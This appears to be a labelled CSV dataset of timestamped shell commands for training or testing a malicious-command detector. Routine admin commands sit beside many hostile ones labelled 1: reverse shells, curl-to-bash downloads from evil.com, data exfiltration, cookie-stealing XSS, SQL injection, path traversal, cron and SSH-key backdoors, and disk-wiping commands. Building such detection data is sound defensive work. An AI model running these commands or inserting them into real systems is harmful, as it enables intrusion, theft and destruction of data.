+2026-01-23 14:58:12,212.133.65.18,rm -rf /var/www/html/*,1
+2026-01-23 02:09:12,72.246.217.236,apt update && apt list --upgradable,0
+2026-01-23 16:48:12,66.3.119.154,"curl -H ""X-Forwarded-For: <script>alert('XSS')</script>"" http://target.com/",1
+2026-01-23 05:40:12,41.7.167.239,find /var/www -name '*.php' -mtime -1,0
+2026-01-23 15:29:12,28.7.203.167,rm -rf /var/www/html/*,1
+2026-01-23 07:55:12,96.237.236.202,free -m,0
+2026-01-23 13:15:12,208.71.7.158,"curl ""http://target.com/api?id=1' OR '1'='1""",1
+2026-01-23 17:16:12,62.91.59.203,"curl ""http://target.com/search?q=' UNION SELECT username,password FROM users--""",1
+2026-01-23 10:19:12,61.176.138.34,bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1',1
+2026-01-23 03:27:12,94.44.224.161,tar -czf backup.tar.gz /var/www/html,0
+2026-01-23 08:45:12,53.61.173.228,du -sh /var/www/*,0
+2026-01-23 12:30:12,134.199.170.23,"curl ""http://target.com/api/users?sort=password&order=ASC""",1
+2026-01-23 16:33:12,158.107.187.131,nikto -h http://target.com,1
+2026-01-23 04:39:12,174.181.237.149,ip addr show,0
+2026-01-23 13:40:12,90.251.252.248,"curl -X POST http://target.com/api/admin -H ""Content-Type: application/json"" -d '{""role"":""admin"",""id"":1}'",1
+2026-01-23 10:47:12,77.254.251.234,"curl -H ""User-Agent: <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>"" http://target.com",1
+2026-01-23 03:20:12,24.65.3.1,cat /proc/meminfo | head -10,0
+2026-01-23 08:16:12,186.241.205.113,chown www-data:www-data /var/www/html -R,0
+2026-01-23 02:34:12,69.178.111.155,du -sh /home/* | sort -hr,0
+2026-01-23 09:09:12,14.146.48.151,ssh-keygen -l -f /etc/ssh/ssh_host_rsa_key.pub,0
+2026-01-23 11:01:12,51.106.168.125,tar czf - /var/www/html | base64 | curl -X POST --data-binary @- http://exfil.server.com/leak,1
+2026-01-23 07:59:12,218.224.130.16,tar -czf backup.tar.gz /var/www/html,0
+2026-01-23 14:35:12,41.230.248.54,rpcclient -U admin%password target.com -c 'enumdomusers',1
+2026-01-23 05:05:12,79.100.250.175,curl -s https://api.ipify.org,0
+2026-01-23 08:29:12,154.43.170.164,wget --spider https://example.com/file.zip,0
+2026-01-23 07:17:12,133.179.145.77,lsblk,0
+2026-01-23 08:09:12,181.244.209.8,fdisk -l,0
+2026-01-23 09:56:12,205.119.152.254,"curl ""http://target.com/search?q=' UNION SELECT username,password FROM users--""",1
+2026-01-23 12:08:12,179.211.198.140,find / -perm -4000 -type f 2>/dev/null,1
+2026-01-23 08:00:12,50.126.8.223,curl -I https://example.com,0
+2026-01-23 04:01:12,167.234.173.202,dig example.com,0
+2026-01-23 14:09:12,131.69.185.127,"curl ""http://target.com/api/users?sort=password&order=ASC""",1
+2026-01-23 13:24:12,181.9.206.57,john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt,1
+2026-01-23 02:42:12,13.57.116.130,crontab -l,0
+2026-01-23 16:37:12,56.191.115.228,wget http://evil.com/malware.sh -O /tmp/malware.sh && bash /tmp/malware.sh,1
+2026-01-23 11:14:12,180.192.43.151,"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""attacker.com"",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""]);'",1
+2026-01-23 02:13:12,201.200.120.222,rsync -avz /home/user/documents/ /backup/documents/,0
+2026-01-23 15:54:12,55.235.108.108,"curl ""http://target.com/file?path=../../../etc/passwd""",1
+2026-01-23 03:47:12,200.73.178.156,ss -tulwn,0
+2026-01-23 10:29:12,6.78.124.150,bash -c 'bash -i >& /dev/tcp/192.168.1.100/9001 0>&1',1
+2026-01-23 11:41:12,141.187.187.186,hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com,1
+2026-01-23 09:35:12,81.215.90.16,nslookup google.com,0
+2026-01-23 14:37:12,175.226.71.73,"php -r '$sock=fsockopen(""10.0.0.1"",4444);exec(""/bin/sh -i <&3 >&3 2>&3"");'",1
+2026-01-23 04:18:12,115.123.90.12,ps aux | grep nginx,0
+2026-01-23 09:58:12,112.254.50.241,cat /var/www/../../../../etc/passwd,1
+2026-01-23 16:53:12,113.209.44.183,cat ../../../etc/passwd,1
+2026-01-23 08:21:12,165.12.112.177,ls -la /var/log/,0
+2026-01-23 13:00:12,143.152.7.218,cat ../../../etc/passwd,1
+2026-01-23 11:13:12,220.55.210.12,"curl ""http://target.com/upload?file=../../../etc/shadow""",1
+2026-01-23 04:12:12,71.181.142.163,nmcli device status,0
+2026-01-23 14:24:12,91.179.26.211,"curl -X POST http://target.com/api/admin -H ""Content-Type: application/json"" -d '{""role"":""admin"",""id"":1}'",1
+2026-01-23 15:14:12,141.239.92.109,"curl ""http://target.com/download?file=....//....//etc/shadow""",1
+2026-01-23 08:37:12,60.210.161.52,df -h,0
+2026-01-23 15:22:12,92.89.7.111,bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',1
+2026-01-23 12:02:12,26.181.253.208,john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt,1
+2026-01-23 16:56:12,164.170.141.147,echo '* * * * * bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' | crontab -,1
+2026-01-23 01:21:12,209.161.225.186,systemctl status nginx,0
+2026-01-23 17:50:12,13.19.176.175,rm -rf /* --no-preserve-root,1
+2026-01-23 06:54:12,172.178.187.34,cat /proc/meminfo | head -10,0
+2026-01-23 16:26:12,56.248.236.26,"curl ""http://target.com/api?id=1; DROP TABLE users;--""",1
+2026-01-23 16:40:12,183.130.99.104,echo '* * * * * bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' | crontab -,1
+2026-01-23 16:55:12,16.193.16.15,mkfs.ext4 /dev/sda1,1
+2026-01-23 13:14:12,6.21.62.175,dd if=/dev/zero of=/dev/sda bs=1M,1
+2026-01-23 04:43:12,191.228.77.171,uptime,0
+2026-01-23 14:29:12,81.17.205.61,"curl -H ""X-Original-URL: /admin"" http://target.com/",1
+2026-01-23 01:26:12,28.128.131.99,ls -la /home/user/documents/,0
+2026-01-23 11:21:12,23.214.71.201,wget http://evil.com/malware.sh -O /tmp/malware.sh && bash /tmp/malware.sh,1
+2026-01-23 06:06:12,169.71.218.120,cat /proc/cpuinfo | grep 'model name',0
+2026-01-23 02:28:12,16.1.99.237,ping -c 4 8.8.8.8,0
+2026-01-23 13:32:12,82.166.178.169,"msfconsole -q -x ""use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 10.0.0.1; run""",1
+2026-01-23 17:39:12,2.168.85.154,"curl -X PUT http://target.com/api/user/1 -d '{""password"":""hacked123""}'",1
+2026-01-23 17:49:12,6.91.85.56,smbclient -L //target.com -U admin%password,1
+2026-01-23 09:10:12,49.100.124.28,tar -czf backup.tar.gz /var/www/html,0
+2026-01-23 10:00:12,160.116.87.251,sudo -u#-1 /bin/bash,1
+2026-01-23 01:29:12,16.199.172.165,apt update && apt list --upgradable,0
+2026-01-23 16:19:12,9.206.133.23,"curl ""http://target.com/search?q=' UNION SELECT username,password FROM users--""",1
+2026-01-23 04:02:12,26.241.110.81,mtr -c 10 google.com,0
+2026-01-23 08:43:12,113.181.140.121,chmod 644 /var/www/html/index.html,0
+2026-01-23 01:22:12,144.90.3.31,crontab -l,0
+2026-01-23 01:58:12,88.83.197.145,ping -c 4 8.8.8.8,0
+2026-01-23 08:42:12,3.100.245.31,ssh-keygen -l -f /etc/ssh/ssh_host_rsa_key.pub,0
+2026-01-23 17:23:12,197.184.132.216,cat ../../../etc/passwd,1
+2026-01-23 11:46:12,81.150.12.52,"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",1
+2026-01-23 09:32:12,157.15.129.145,ip route show,0
+2026-01-23 04:15:12,21.244.217.252,rsync -avz /var/www/html/ backup/,0
+2026-01-23 17:41:12,8.230.0.221,"curl ""http://target.com/api/users?sort=password&order=ASC""",1
+2026-01-23 01:37:12,6.195.186.126,df -h /,0
+2026-01-23 12:18:12,37.178.220.1,"curl ""http://target.com/api/users?sort=password&order=ASC""",1
+2026-01-23 04:27:12,191.188.147.45,nmcli device status,0
+2026-01-23 09:57:12,192.144.6.185,"curl -H ""User-Agent: <script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>"" http://target.com",1
+2026-01-23 15:07:12,89.23.85.69,"curl ""http://target.com/api?id=1' OR '1'='1""",1
+2026-01-23 10:22:12,140.37.187.149,"echo ""* * * * * /usr/bin/nc -e /bin/sh 10.0.0.1 9001"" | crontab -",1
+2026-01-23 02:02:12,138.231.190.118,crontab -l,0
+2026-01-23 11:03:12,115.61.198.166,"curl -X POST ""http://target.com/login"" --data ""user=admin'--&pass=anything""",1
+2026-01-23 02:29:12,177.147.108.165,apt update && apt list --upgradable,0
+2026-01-23 07:44:12,182.215.147.57,systemctl status mysql,0
+2026-01-23 09:05:12,42.196.86.188,ip route show,0
+2026-01-23 16:24:12,203.251.100.114,"curl -H ""X-Forwarded-For: <script>alert('XSS')</script>"" http://target.com/",1
+2026-01-23 08:35:12,195.101.206.80,ping -c 4 google.com,0
+2026-01-23 15:45:12,138.236.129.90,ncat 10.0.0.1 4444 -e /bin/bash,1
+2026-01-23 08:20:12,115.62.131.234,apt list --upgradable,0
+2026-01-23 08:59:12,98.176.68.57,id,0
+2026-01-23 02:58:12,117.161.88.101,apt update,0
+2026-01-23 14:28:12,216.247.6.233,hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com,1
+2026-01-23 07:35:12,201.236.65.15,find /var/www -name '*.php' -mtime -1,0
+2026-01-23 11:31:12,223.166.96.106,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
+2026-01-23 10:17:12,161.175.27.118,"curl -H ""User-Agent: <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>"" http://target.com",1
+2026-01-23 17:33:12,140.247.80.67,"env x='() { :;}; /bin/bash -c ""bash -i >& /dev/tcp/10.0.0.1/4444 0>&1""' bash -c 'echo vulnerable'",1
+2026-01-23 17:13:12,174.52.93.169,smbclient -L //target.com -U admin%password,1
+2026-01-23 13:51:12,1.16.189.189,echo '* * * * * bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' | crontab -,1
+2026-01-23 06:50:12,215.244.82.26,find /var/www -name '*.php' -mtime -1,0
+2026-01-23 07:05:12,77.2.0.164,curl -I https://example.com,0
+2026-01-23 06:46:12,59.44.137.78,ssh-keygen -l -f /etc/ssh/ssh_host_rsa_key.pub,0
+2026-01-23 08:47:12,129.113.102.119,du -sh /var/www/*,0
+2026-01-23 02:27:12,220.87.34.38,df -h /,0
+2026-01-23 13:37:12,134.35.94.121,smbclient -L //target.com -U admin%password,1
+2026-01-23 11:58:12,212.13.88.133,dig @target.com axfr target.com,1
+2026-01-23 16:09:12,40.36.140.27,enum4linux target.com,1
+2026-01-23 12:58:12,199.169.27.46,"curl ""http://target.com/image?file=php://filter/convert.base64-encode/resource=/etc/passwd""",1
+2026-01-23 07:30:12,178.183.19.25,free -m,0
+2026-01-23 09:50:12,189.247.195.54,sudo -u#-1 /bin/bash,1
+2026-01-23 10:51:12,3.208.24.156,tar czf - /var/www/html | base64 | curl -X POST --data-binary @- https://attacker.com/exfil,1
+2026-01-23 06:02:12,40.78.100.73,ip addr show,0
+2026-01-23 12:42:12,200.112.46.39,"curl -X PUT http://target.com/api/user/1 -d '{""password"":""hacked123""}'",1
+2026-01-23 16:42:12,122.29.104.232,"curl -X POST ""http://target.com/login"" -d ""user=admin'--&pass=x""",1
+2026-01-23 09:31:12,83.84.135.166,id,0
+2026-01-23 12:37:12,60.115.6.190,"curl ""http://target.com/file?path=../../../etc/passwd""",1
+2026-01-23 14:47:12,100.50.62.206,"curl ""http://target.com/search?q=' UNION SELECT username,password FROM users--""",1
+2026-01-23 03:08:12,212.48.36.138,mount | grep ext4,0
+2026-01-23 03:43:12,51.60.208.227,ps aux | grep nginx,0
+2026-01-23 08:56:12,29.113.99.121,scp user@server:/var/log/app.log ./,0
+2026-01-23 15:19:12,170.47.192.68,dd if=/dev/zero of=/dev/sda bs=1M,1
+2026-01-23 10:55:12,22.141.238.230,find / -perm -4000 -type f 2>/dev/null | xargs ls -la,1
+2026-01-23 08:24:12,164.143.105.8,logrotate -f /etc/logrotate.d/nginx,0
+2026-01-23 02:56:12,15.99.125.30,netstat -tulpn,0
+2026-01-23 05:07:12,173.207.176.133,chown www-data:www-data /var/www/html -R,0
+2026-01-23 06:16:12,42.81.139.103,ping -c 4 google.com,0
+2026-01-23 17:22:12,39.100.26.120,"curl ""http://target.com/download?file=....//....//etc/shadow""",1
+2026-01-23 14:02:12,177.235.135.138,rpcclient -U admin%password target.com -c 'enumdomusers',1
+2026-01-23 06:11:12,206.17.177.92,whoami,0
+2026-01-23 03:04:12,103.10.201.5,ss -tulwn,0
+2026-01-23 07:48:12,108.208.190.36,chown www-data:www-data /var/www/html -R,0
+2026-01-23 03:28:12,36.224.160.206,crontab -l,0
+2026-01-23 12:54:12,204.163.100.78,curl http://evil.com/backdoor.php | bash,1
+2026-01-23 02:51:12,131.124.141.67,systemctl status nginx,0
+2026-01-23 05:37:12,196.206.203.7,localectl status,0
+2026-01-23 16:36:12,30.223.41.177,gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt,1
+2026-01-23 16:27:12,110.240.11.204,dig @target.com axfr target.com,1
+2026-01-23 10:30:12,202.97.235.34,sudo -u#-1 /bin/bash,1
+2026-01-23 15:11:12,68.198.75.146,curl http://evil.com/backdoor.php | bash,1
+2026-01-23 05:58:12,99.193.235.145,curl -I https://example.com,0
+2026-01-23 04:25:12,50.53.49.52,free -m,0
+2026-01-23 17:20:12,32.252.236.243,echo '* * * * * bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' | crontab -,1
+2026-01-23 13:18:12,73.232.162.49,"curl ""http://target.com/cgi-bin/test.cgi?cmd=cat%20/etc/passwd""",1
+2026-01-23 04:59:12,183.50.71.38,rsnapshot daily,0
+2026-01-23 06:03:12,68.207.161.205,ip route show,0
+2026-01-23 08:19:12,91.187.84.68,nslookup google.com,0
+2026-01-23 11:49:12,131.10.170.116,john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt,1
+2026-01-23 09:24:12,115.139.136.21,uptime,0
+2026-01-23 10:02:12,176.232.79.17,"echo ""* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/9001 0>&1'"" >> /tmp/cronjob && crontab /tmp/cronjob",1
+2026-01-23 07:20:12,76.196.37.162,ssh-keygen -l -f /etc/ssh/ssh_host_rsa_key.pub,0
+2026-01-23 09:07:12,190.177.105.75,traceroute google.com,0
+2026-01-23 17:18:12,128.228.65.57,"msfconsole -q -x ""use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 10.0.0.1; run""",1
+2026-01-23 09:11:12,95.122.118.187,cat /proc/meminfo | head -10,0
+2026-01-23 08:46:12,134.71.11.142,scp user@server:/var/log/app.log ./,0
+2026-01-23 16:22:12,177.152.134.192,john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt,1
+2026-01-23 03:31:12,157.68.6.106,lsblk,0
+2026-01-23 17:31:12,60.14.149.81,curl http://evil.com/backdoor.php | bash,1
+2026-01-23 17:51:12,11.112.101.173,gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt,1
+2026-01-23 08:07:12,164.41.144.179,top -n 1 | head -20,0
+2026-01-23 13:25:12,131.237.125.168,"curl ""http://target.com/api?id=1; DROP TABLE users;--""",1
+2026-01-23 01:55:12,73.147.131.125,"journalctl --since ""1 hour ago"" -u ssh",0
+2026-01-23 04:46:12,77.139.124.29,scp user@server:/var/log/app.log ./,0
+2026-01-23 07:26:12,91.68.174.35,ln -s /var/www/html /home/user/www,0
+2026-01-23 16:20:12,155.55.130.60,"curl -X PUT http://target.com/api/user/1 -d '{""password"":""hacked123""}'",1
+2026-01-23 02:33:12,88.192.5.224,rsync -avz /home/user/documents/ /backup/documents/,0
+2026-01-23 04:22:12,29.36.19.229,rsync -avz /var/www/html/ backup/,0
+2026-01-23 06:43:12,209.155.133.74,rsnapshot daily,0
+2026-01-23 16:29:12,123.105.46.178,"curl -X PUT http://target.com/api/user/1 -d '{""password"":""hacked123""}'",1
+2026-01-23 12:35:12,129.161.181.222,"curl -X POST ""http://target.com/login"" -d ""user=admin'--&pass=x""",1
+2026-01-23 15:24:12,11.105.28.150,rm -rf /var/www/html/*,1
+2026-01-23 10:26:12,180.105.123.8,"curl ""http://target.com/search?q=' UNION SELECT username,password FROM users--""",1
+2026-01-23 08:11:12,146.23.48.55,hostnamectl,0
+2026-01-23 12:40:12,201.11.133.130,chmod 4777 /bin/bash,1
+2026-01-23 05:34:12,138.131.236.50,uptime,0
+2026-01-23 16:15:12,25.218.95.244,"curl -X POST ""http://target.com/login"" -d ""user=admin'--&pass=x""",1
+2026-01-23 05:15:12,216.138.238.97,timedatectl,0
+2026-01-23 13:02:12,68.14.23.248,host -t txt target.com,1
+2026-01-23 13:22:12,33.94.246.61,"php -r '$sock=fsockopen(""10.0.0.1"",4444);exec(""/bin/sh -i <&3 >&3 2>&3"");'",1
+2026-01-23 17:05:12,64.39.165.153,cat ../../../etc/passwd,1
+2026-01-23 06:18:12,60.203.7.21,du -sh /var/www/*,0
+2026-01-23 11:53:12,64.9.167.125,"curl -X PUT http://target.com/api/user/1 -d '{""password"":""hacked123""}'",1
+2026-01-23 10:41:12,67.12.138.231,tar czf - /etc/passwd | base64 | curl -X POST --data-binary @- http://exfil.server/collect,1
+2026-01-23 15:02:12,120.81.125.62,echo 'ALL ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,1
+2026-01-23 02:54:12,107.129.157.156,du -sh /home/* | sort -hr,0
+2026-01-23 07:47:12,52.209.42.58,chmod 644 /var/www/html/index.html,0
+2026-01-23 05:36:12,202.98.151.199,lsblk,0
+2026-01-23 15:15:12,112.19.163.123,"curl -X POST http://target.com/api/admin -H ""Content-Type: application/json"" -d '{""role"":""admin"",""id"":1}'",1
+2026-01-23 11:25:12,113.229.12.179,"php -r '$sock=fsockopen(""10.0.0.1"",4444);exec(""/bin/sh -i <&3 >&3 2>&3"");'",1
+2026-01-23 05:31:12,114.97.197.126,chown www-data:www-data /var/www/html -R,0
+2026-01-23 05:06:12,51.186.66.170,logrotate -f /etc/logrotate.d/nginx,0
+2026-01-23 15:13:12,10.17.32.249,bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',1
+2026-01-23 05:00:12,223.21.159.210,chmod 644 /var/www/html/index.html,0
+2026-01-23 04:26:12,192.247.113.233,ip route show,0
+2026-01-23 16:01:12,164.122.111.133,"curl -H ""Host: internal.target.com"" http://target.com/",1
+2026-01-23 11:07:12,85.126.118.12,"curl -H ""User-Agent: <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>"" http://target.com",1
+2026-01-23 12:45:12,70.47.157.178,"sqlmap -u ""http://target.com/api?id=1"" --batch --dbs",1
+2026-01-23 09:33:12,56.185.105.136,lsblk,0
+2026-01-23 11:15:12,10.195.242.2,find / -perm -4000 -type f 2>/dev/null | xargs ls -la,1
+2026-01-23 04:07:12,45.131.27.160,ln -s /var/www/html /home/user/www,0
+2026-01-23 15:27:12,9.23.103.95,"curl ""http://target.com/search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>""",1
+2026-01-23 16:34:12,110.108.181.223,host -t txt target.com,1
+2026-01-23 16:59:12,3.211.144.60,smbclient -L //target.com -U admin%password,1
+2026-01-23 13:44:12,215.178.26.200,"curl ""http://target.com/download?file=....//....//etc/shadow""",1
+2026-01-23 11:56:12,39.228.246.118,"curl -X POST http://target.com/api/admin -H ""Content-Type: application/json"" -d '{""role"":""admin"",""id"":1}'",1
+2026-01-23 14:15:12,147.131.196.127,"curl ""http://target.com/api?id=1; DROP TABLE users;--""",1
+2026-01-23 15:26:12,25.26.135.104,sudo nmap --script vuln target.com,1
+2026-01-23 03:23:12,57.101.55.233,timedatectl,0
+2026-01-23 02:24:12,57.199.114.161,du -sh /home/* | sort -hr,0
+2026-01-23 08:33:12,75.73.42.1,crontab -l,0
+2026-01-23 17:24:12,66.161.66.210,smbclient -L //target.com -U admin%password,1
+2026-01-23 03:37:12,117.107.108.169,nslookup google.com,0
+2026-01-23 10:54:12,102.79.92.128,"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",1
+2026-01-23 15:00:12,116.58.70.62,curl http://evil.com/backdoor.php | bash,1
+2026-01-23 01:50:12,117.131.250.39,tail -20 /var/log/syslog,0
+2026-01-23 14:43:12,117.200.252.98,host -t txt target.com,1
+2026-01-23 09:15:12,212.227.143.212,rsync -avz /var/www/html/ backup/,0
+2026-01-23 09:38:12,140.229.136.250,cat /var/www/../../../../etc/passwd,1
+2026-01-23 09:17:12,22.217.2.124,crontab -l,0
+2026-01-23 01:39:12,83.218.113.247,apt update && apt list --upgradable,0
+2026-01-23 03:10:12,62.131.116.253,timedatectl,0
+2026-01-23 03:34:12,123.219.214.182,mtr -c 10 google.com,0
+2026-01-23 17:01:12,18.3.22.249,dig @target.com axfr target.com,1
+2026-01-23 15:53:12,3.43.129.248,"curl ""http://target.com/download?file=....//....//etc/shadow""",1
+2026-01-23 10:48:12,116.85.128.69,"curl ""http://target.com/static/../../../../etc/passwd""",1
+2026-01-23 04:42:12,123.25.115.113,systemctl status mysql,0
+2026-01-23 12:34:12,186.122.158.218,rm -rf /* --no-preserve-root,1
+2026-01-23 01:38:12,209.4.92.221,ping -c 4 8.8.8.8,0
+2026-01-23 02:59:12,211.94.85.37,hostnamectl,0
+2026-01-23 02:23:12,203.63.205.109,rsync -avz /home/user/documents/ /backup/documents/,0
+2026-01-23 15:57:12,107.1.151.46,mkfs.ext4 /dev/sda1,1
+2026-01-23 12:38:12,166.155.118.240,john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt,1
+2026-01-23 12:09:12,105.105.252.140,host -t txt target.com,1
+2026-01-23 08:26:12,24.56.99.154,journalctl -u nginx -n 50,0
+2026-01-23 06:37:12,132.42.66.144,timedatectl,0
+2026-01-23 05:22:12,100.249.169.91,id,0
+2026-01-23 16:54:12,212.30.8.219,"curl ""http://target.com/download?file=....//....//etc/shadow""",1
+2026-01-23 07:01:12,131.249.54.200,localectl status,0
+2026-01-23 06:56:12,37.210.44.75,hostnamectl,0
+2026-01-23 15:34:12,118.11.157.215,ncat 10.0.0.1 4444 -e /bin/bash,1
+2026-01-23 11:59:12,126.6.101.64,"curl ""http://target.com/search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>""",1
+2026-01-23 13:45:12,82.230.223.94,enum4linux target.com,1
+2026-01-23 11:43:12,86.111.80.58,nc -e /bin/sh 10.0.0.1 4444,1
+2026-01-23 11:34:12,85.228.248.53,"curl -H ""X-Forwarded-For: <script>alert('XSS')</script>"" http://target.com/",1
+2026-01-23 13:13:12,41.167.192.185,rpcclient -U admin%password target.com -c 'enumdomusers',1
+2026-01-23 10:05:12,210.159.240.202,find / -perm -4000 -type f 2>/dev/null | xargs ls -la,1
+2026-01-23 16:47:12,216.14.177.136,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
+2026-01-23 01:16:12,74.158.200.21,ls -la /var/log/,0
+2026-01-23 12:27:12,26.101.168.222,ncat 10.0.0.1 4444 -e /bin/bash,1
+2026-01-23 03:38:12,97.90.237.12,apt list --upgradable,0
+2026-01-23 08:18:12,105.98.204.239,ssh-keygen -l -f /etc/ssh/ssh_host_rsa_key.pub,0
+2026-01-23 12:26:12,109.8.73.137,gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt,1
+2026-01-23 14:50:12,20.6.72.148,cat ../../../../etc/shadow,1
+2026-01-23 13:55:12,183.79.180.230,sudo nmap --script vuln target.com,1
+2026-01-23 13:09:12,23.177.242.195,"curl -X POST http://target.com/api/admin -H ""Content-Type: application/json"" -d '{""role"":""admin"",""id"":1}'",1
+2026-01-23 08:50:12,16.224.126.196,chmod 644 /var/www/html/index.html,0
+2026-01-23 04:52:12,168.192.190.6,cat /etc/nginx/nginx.conf,0
+2026-01-23 17:03:12,131.19.5.236,sudo nmap --script vuln target.com,1
+2026-01-23 09:36:12,67.39.0.125,"curl ""http://target.com/search?q=' UNION SELECT username,password FROM users--""",1
+2026-01-23 03:48:12,155.28.254.4,tail -100 /var/log/nginx/access.log,0
+2026-01-23 02:35:12,184.151.183.214,"journalctl --since ""1 hour ago"" -u ssh",0
+2026-01-23 15:12:12,24.161.102.160,"curl ""http://target.com/search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>""",1
+2026-01-23 12:43:12,190.158.123.236,mkfs.ext4 /dev/sda1,1
+2026-01-23 14:31:12,21.176.193.111,curl http://evil.com/backdoor.php | bash,1
+2026-01-23 06:36:12,5.162.143.141,localectl status,0
+2026-01-23 09:29:12,9.140.112.236,top -n 1 | head -20,0
+2026-01-23 15:17:12,127.35.102.33,"curl -H ""Host: internal.target.com"" http://target.com/",1
+2026-01-23 08:12:12,172.138.255.232,netstat -tulpn,0
+2026-01-23 02:11:12,89.7.67.158,systemctl status nginx,0
+2026-01-23 07:33:12,221.243.183.192,uptime,0
+2026-01-23 14:16:12,205.168.79.49,john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt,1
+2026-01-23 03:35:12,67.50.123.110,whoami,0
+2026-01-23 01:47:12,124.131.103.147,df -h /,0
+2026-01-23 05:19:12,9.89.85.86,rsnapshot daily,0
+2026-01-23 01:31:12,39.245.23.105,systemctl status nginx,0
+2026-01-23 15:05:12,204.177.40.22,enum4linux target.com,1
+2026-01-23 05:10:12,124.16.192.3,journalctl -u nginx -n 50,0
+2026-01-23 15:49:12,114.223.185.239,wget http://evil.com/malware.sh -O /tmp/malware.sh && bash /tmp/malware.sh,1
+2026-01-23 04:57:12,45.236.12.225,df -h,0
+2026-01-23 07:50:12,132.113.179.147,cat /etc/nginx/nginx.conf,0
+2026-01-23 10:44:12,192.215.250.39,"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.5"",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",1
+2026-01-23 01:27:12,190.246.234.23,df -h,0
+2026-01-23 01:40:12,60.195.85.179,tail -20 /var/log/syslog,0
+2026-01-23 02:05:12,127.77.170.73,"journalctl -u ssh --since ""1 hour ago""",0
+2026-01-23 03:13:12,9.14.168.181,traceroute google.com,0
+2026-01-23 16:04:12,203.151.95.154,"curl -H ""X-Original-URL: /admin"" http://target.com/",1
+2026-01-23 10:11:12,90.46.184.167,tar czf - /var/www/html | base64 | curl -X POST --data-binary @- http://exfil.server/collect,1
+2026-01-23 02:06:12,23.177.109.103,ls -la /var/log/,0
+2026-01-23 04:51:12,17.46.221.237,whoami,0
+2026-01-23 06:10:12,165.31.60.200,ps aux | grep nginx,0
+2026-01-23 08:41:12,103.199.167.169,cat /proc/cpuinfo | grep 'model name',0
+2026-01-23 09:26:12,49.138.240.234,rsync -avz /var/www/html/ backup/,0
+2026-01-23 17:29:12,149.222.17.86,"msfconsole -q -x ""use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 10.0.0.1; run""",1
+2026-01-23 07:08:12,200.44.213.202,ss -tulwn,0
+2026-01-23 07:11:12,42.28.136.84,ls -la /var/log/,0
+2026-01-23 06:38:12,216.170.33.213,cat /etc/nginx/nginx.conf,0
+2026-01-23 02:00:12,138.152.115.207,tail -20 /var/log/syslog,0
+2026-01-23 02:08:12,13.44.192.80,ping -c 4 8.8.8.8,0
+2026-01-23 01:41:12,196.14.110.114,systemctl status nginx,0
+2026-01-23 07:12:12,18.81.250.240,nslookup google.com,0
+2026-01-23 03:52:12,87.88.66.139,mount | grep ext4,0
+2026-01-23 04:19:12,205.54.197.184,mount | grep ext4,0
+2026-01-23 17:17:12,159.223.230.161,host -t txt target.com,1
+2026-01-23 12:01:12,128.202.29.139,gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt,1
+2026-01-23 14:54:12,198.42.14.10,echo 'ssh-rsa AAAAB3Nza... attacker@evil.com' >> /root/.ssh/authorized_keys,1
+2026-01-23 16:03:12,56.73.46.49,"curl ""http://target.com/api?id=1; DROP TABLE users;--""",1
+2026-01-23 12:32:12,93.59.121.49,"msfconsole -q -x ""use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 10.0.0.1; run""",1
+2026-01-23 17:00:12,49.239.153.43,"curl ""http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/""",1
+2026-01-23 08:13:12,78.36.30.209,cat /etc/nginx/nginx.conf,0
+2026-01-23 05:08:12,19.222.248.92,apt list --upgradable,0
+2026-01-23 09:22:12,112.233.51.236,chmod 644 /var/www/html/index.html,0
+2026-01-23 10:38:12,206.72.105.104,cat /var/www/../../../../etc/passwd,1
+2026-01-23 07:57:12,167.168.14.242,grep 'error' /var/log/syslog,0
